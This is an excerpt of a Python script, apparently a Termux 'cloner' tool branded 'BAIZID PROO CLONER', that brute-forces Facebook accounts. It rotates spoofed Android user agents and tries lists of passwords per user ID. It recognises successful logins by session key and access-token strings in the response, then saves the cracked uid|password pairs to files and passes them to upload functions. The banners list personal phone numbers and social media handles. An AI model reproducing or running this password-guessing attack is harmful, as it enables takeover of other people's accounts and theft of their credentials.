...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/BAPJI-BJ-TM?tab=repositories"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/BAPJI.BJ.TM")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WHATSAPP >> +8801747192851")
	subprocess.check_output(["am", "start", "https://m.me/BAPJI.BJ.TM"])
 
def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍This tool is offical for BAPJI TEAM")
...
\033[1;96m═══════════════════════════════════════════════════════════\033[1;96m
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MD Baizid Mostafa Asif
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSUP  : +8801867705596
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : BAIZID-171
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : DONT TRY TO COPPY MY SCRYPT
\033[1;96m═══════════════════════════════════════════════════════════\033[1;96m
    """)
		print("%s [%s•%s] %sTOOL NAME : %s𝐁𝐀𝐈𝐙𝐈𝐃🔥PROO CLONER🔥"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s2.0.4"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/2.1.0 (Linux; U; Android 12; SM-G525F Build/SP1A.210812.016)", 
			"Mozilla/5.0 (Linux; Android 12; CPH2131) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36;]"
		...
		sys.stdout.write(
			"\r\r %s[🥰>_] [PLAY] : %s/%s -> \033[0;92m [ 𝐁𝐀𝐈𝐙𝐈𝐃𓅨-OK:%s ]- \033[0;91m[𝐁𝐀𝐈𝐙𝐈𝐃𓅨-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[𝐁𝐀𝐈𝐙𝐈𝐃𓅨-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [𝐁𝐀𝐈𝐙𝐈𝐃𓅨-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[𝐁𝐀𝐈𝐙𝐈𝐃𓅨-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [𝐁𝐀𝐈𝐙𝐈𝐃𓅨-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
